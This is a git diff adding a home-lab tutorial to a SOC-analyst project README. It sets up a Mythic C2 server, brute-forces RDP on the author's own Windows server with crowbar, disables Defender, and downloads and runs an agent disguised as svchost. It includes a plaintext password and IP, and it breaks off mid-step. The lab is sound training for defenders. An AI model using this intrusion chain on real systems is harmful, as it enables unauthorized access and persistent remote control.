@@ -432,3 +432,222 @@ For this project we are using:
   <img src="https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20174522.png" alt="image alt">
 </p>
 
+# Setup Mythic Server
+
+1. Go to Vultr to Create a VM to use with Mythic.
+   - Deploy Instance
+   - Cloud Compute – Shared CPU
+   - Location
+   - Ubuntu 22.04 LTS x64
+   - Specs: 80GB SSD 2 vCPUs 4GB 80GB SSD 3 TB
+   - Enter Hostname
+   - Deploy
+
+2. Install Kali Linux on VMWare
+   *if you need help with this I will provide a link to how to install Kali on a Windows OS.*
+   (https://www.stationx.net/how-to-install-kali-linux-on-vmware/) by Richard Dezso
+
+3. Now SSH with Powershell and install Mythic
+   - Go to powershell
+     - Input: `ssh root@ipaddress` (copy the ipaddress and password from your Vultr VM)
+     - Update repositories  
+       input: `apt-get update && apt-get upgrade -y`
+   - Install Docker Compose  
+     Input: `apt install docker-compose`
+   - Install make  
+     Input: `apt install make`
+   - Clone the Repository  
+     Input: `git clone https://github.com/its-a-feature/Mythic`
+   - Let's check what files we have:  
+     Input: `ls`  
+     Input: `cd Mythic`
+   - Now install Shell Script  
+     Input: `./install_docker_ubuntu.sh`
+   - Input: `systemctl restart docker`
+   - Input: `systemctl status docker`  
+     *Docker should now be active.*
+   - Input: `make`
+
+   - Let's start the Mythic CLI (Command Line)  
+     Input: `./mythic-cli start`
+
+4. Implement a Firewall rule to prevent others from connecting, only us.
+   - Go to Vultr
+     - Add a firewall rule for "My IP"
+     - Add a firewall rule for "Custom" - *use Windows Server IP*
+     - Add a firewall rule for "Custom" - *use Linux SSH Server IP*  
+     - Go to Mythic server in Vultr
+       - Firewall
+       - Select the Mythic firewall we just created
+       - Update firewall group
+
+5. Log into Mythic Web GUI
+   - Copy Mythic IP address and paste in web browser  
+     Input: `ipaddress:7443` *add an 's' for https in your URL or it will return an error 400*  
+     *The password will be in the environment variable in Powershell.*  
+     Input: `ls -lah`  
+     *(env is a hidden file, configuration file)*  
+     Input: `cat .env`  
+     - Find the password for `MYTHIC_ADMIN_PASSWORD=`  
+     - Copy the password
+
+   - Now at the login prompt:
+     - Input: `mythic_admin`
+     - Paste password  
+     *You will now be able to make changes and mess around with the Mythic GUI.*
+
+## Setup Mythic Server and Agent
+
+**Objective: Perform a brute force attack and establish a C2 (Command and Control) session.**  
+Tools: Use Mythic C2 and Kali Linux for the attack on a Windows server.  
+
+Phases of the attack:
+- Phase 1: Perform a brute force attack to gain unauthorized access to the Windows server.
+- Phase 2: Run discovery commands to gather information and evade defenses.
+- Phase 3: Execute commands on the compromised system using Mythic C2.
+- Phase 4: Generate a Mythic agent, then use PowerShell to download the agent onto the Windows server.
+- Phase 5: Establish a C2 connection to the Mythic server and use it to retrieve a password.
+
+## Phase 1:
+1. Use RDP to connect to the Windows Server
+   - Create a text file named: `passwords.txt` in the Documents folder.
+   - Change the password for the user to the same one in the text file.
+     *For this project, we needed to edit the group policy of local accounts.*
+
+2. Log in to your Kali Linux VM
+   - Open a command prompt
+   - Use: `cd /usr/share/wordlists`
+   - Use: `ls`
+   - Unzip the file named `rockyou.txt.gz`
+     - Use: `sudo gunzip rockyou.txt.gz`
+     - Enter password
+   - Let's look in the file  
+     - Use: `cat rockyou.txt.gz | less`  
+     *You can see the most common passwords.*
+
+   - Use: `head – 50 rockyou.txt > /home/kali/mydfir-wordlist.txt`
+     *Only use the first 50 passwords in the file.*
+   - Add the password you used for your Windows Server to the list  
+     - Use: `nano mydfir-wordlist.txt`  
+     *Enter your password*  
+     - `Ctrl x`, `Ctrl y`
+   *This wordlist will be used to brute force the Windows Server.*
+
+   - Update the repositories
+     - Use: `sudo apt-get update && sudo apt-get upgrade -y`
+   - To fix repositories: 
+     - Use: `sudo apt install gnupg`
+
+   **SCREENSHOT**
+
+   - Install crowbar  
+     Use: `sudo apt-get install -y crowbar`
+
+   - Check to see if crowbar successfully installed  
+     Use: `crowbar -h`
+   - Create a new file  
+     *Copy the Windows server IP address from Vultr.*  
+     Use: `nano target.txt`  
+     - Input: `ip address from windows server, username`
+       - `Ctrl x`, `Ctrl y`, `Enter`
+
+   - Target VM  
+     Use: `crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s (windows public address)/32`  
+     *(`-b = rdp service, -u = user, -C = what you will try to authenticate with, -s = target IP address, /32 = only this IP address)*
+
+   **SCREENSHOT**
+
+   - Use the tool xfreerdp to connect to the Windows server  
+     Use: `xfreerdp /u:Administrator /p:Winter2024! /v:144.202.56.135:3389`
+   - You can see a FreeRDP window pop up  
+     *You are now connected to the Windows server by using brute force with Kali Linux.*
+
+## Phase 2:
+
+- Open a command prompt
+  - Use: `whoami`, `ipconfig`, `net user administrator` *(adds administrator to admin privileges)*
+
+## Phase 3:
+
+- Disable Windows Defender
+  - In Windows security go to Virus & Threat protection
+  - Turn off all settings
+
+## Phase 4:
+
+*Here is a link to the payloads available on Mythic:*  
+https://mythicmeta.github.io/overview/agent_matrix.html
+
+- Login to your Mythic Web GUI
+- Now go to Powershell (Mythic Server)
+- Add the Mythic agent Apollo  
+  Use: `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`
+
+*You will now see Apollo in your Mythic GUI.*
+
+**SCREENSHOT**
+
+- Create a C2 profile  
+  *Here is a list of C2 profiles:*  
+  https://github.com/MythicC2Profiles
+
+  - Go to Powershell (Mythic)  
+    Use: `./mythic-cli install github https://github.com/MythicC2Profiles/http`
+
+    **SCREENSHOT**
+
+- Create a new payload
+  - Actions
+  - Generate new payload
+  - Windows
+  - WinExe
+  - Include every command
+  - Include C2 profile
+  - Callback host:  
+    Use: `http://mythic public IP address`
+    *Very important to remove the 's' from `https://`, this took me an hour of troubleshooting as it would not connect to an active callback in Phase 5.*
+  - Callback port: 80
+  - Payload name: `svchost-miguel.exe`
+  - Description: Payload/Agent
+  - Create payload
+  - Download
+    - Copy link address
+
+**SCREENSHOT**
+
+- Back on Powershell
+  - Use: `pwd`
+  - Use: `wget paste link address --no-check-certificate`
+  - Use: `ls`  
+    *Now you have a new file.*
+  - Change the name of the file  
+    Use: `mv filename svchost-miguel.exe`  
+    Use: `ls`
+
+**SCREENSHOT**
+
+  - Create a directory  
+    Use: `mkdir 1`  
+    Use: `mv svc-miguel.exe 1/`  
+    Use: `cd 1`  
+    Use: `ls`
+  - Firewall allow on port 9999  
+    Use: `ufw allow 9999`  
+    Use: `ufw allow 80`
+
+  - Use a Python module for HTTP  
+    Use: `python3 -m http.server 9999`
+
+## Phase 5:
+
+- Back in Kali (use Powershell, not the command prompt)  
+  Use: `Invoke-WebRequest -Url http://mythic server IP address:9999/svchost-miguel.exe -OutFile “C:\Users\Public\Downloads\svchost-miguel.exe”`
+
+  - Now let's see what's in Downloads  
+    Use: `cd C:\Users\Public\Downloads`  
+    Use: `dir`
+  - Run svchost-miguel.exe  
+    Use: `.\svchost-miguel.exe`  
+    Use: `netstat`  
+    *You should see svchost-mig
+
